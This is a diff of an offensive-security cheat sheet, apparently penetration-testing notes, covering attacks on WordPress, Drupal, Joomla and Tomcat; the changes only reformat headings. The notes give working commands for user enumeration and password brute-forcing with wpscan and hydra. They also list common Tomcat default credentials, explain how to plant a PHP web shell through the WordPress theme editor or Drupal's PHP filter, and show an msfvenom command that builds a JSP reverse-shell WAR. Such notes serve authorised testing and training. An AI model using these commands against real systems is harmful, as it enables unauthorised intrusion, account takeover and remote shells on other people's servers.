@@ -156,28 +156,28 @@
 	(Do not forget to change file formats and supply correct directory list like above)
 
 	**Wordpress**
-		_Enumeration_
+	- _Enumeration_
 		```
 		\# Scan
 		wpscan --rua -e --url IP/URL
 		\# Brute force users/login
 		wpscan --rua --url IP/URL -P /usr/share/wordlists/rockyou.txt -U "USER,USER"
 		```
-		_Theme RCE_
+	- _Theme RCE_
 		```
 		Appearance -> Editor -> 404 Template (at the right)
 		Change the content for a php shell
 		https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
 		http://<IP>/wp-content/themes/twentytwelve/404.php
 		```
-		_Plugin RCE_
+	- _Plugin RCE_
 		Follow this [Link](https://medium.com/swlh/wordpress-file-manager-plugin-exploit-for-unauthenticated-rce-8053db3512ac)
 	**Drupal**
-		_Enumeration_
+	- _Enumeration_
 		```
 		droopescan scan -u IP/URL
 		```
-		_User Enumeration_
+	- _User Enumeration_
 		```
 		In /user/register just try to create a username and if the name is already taken it will be notified :
 		*The name admin is already taken*
@@ -189,11 +189,11 @@
 			- /user/1 -> Access denied (user exist)
 			- /user/2 -> Page not found (user doesn't exist)
 		```
-		_Hidden Pages Enumeration_
+	- _Hidden Pages Enumeration_
 		```
 		wfuzz -c -z range,1-500 --hc 404 URL/node/FUZZ
 		```
-		_Panel RCE_
+	- _Panel RCE_
 		```
 		You need the plugin php to be installed (check it accessing to /modules/php and if it returns a 403 then, exists, if not found, then the plugin php isn't installed)
 		Go to Modules -> (Check) PHP Filter  -> Save configuration
@@ -201,13 +201,13 @@
 		Then click on Add content -> Select Basic Page or Article -> Write php shellcode on the body -> Select PHP code in Text format -> Select Preview
 		```
 	**Joomla**
-		_Enumeration_
+	- _Enumeration_
 		```
 		joomscan -u URL
 		./joomlavs.rb --url URL -a -v
 		```
 	**Tomcat**
-		_Default Credentials_
+	- _Default Credentials_
 		```
 		The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic HTTP auth, the most common credentials are :
 		\
@@ -218,9 +218,11 @@
 		tomcat:s3cr3t
 		admin:tomcat
 		```
-		_Brute Force_
-		```hydra -L USER_LIST -P /usr/share/wordlists/rockyou.txt -f IP http-get /manager/html -vV -u```
-		_Panel RCE_
+	- _Brute Force_
+		```
+		hydra -L USER_LIST -P /usr/share/wordlists/rockyou.txt -f IP http-get /manager/html -vV -u
+		```
+	- _Panel RCE_
 		```
 		\# Generate payload
 		msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
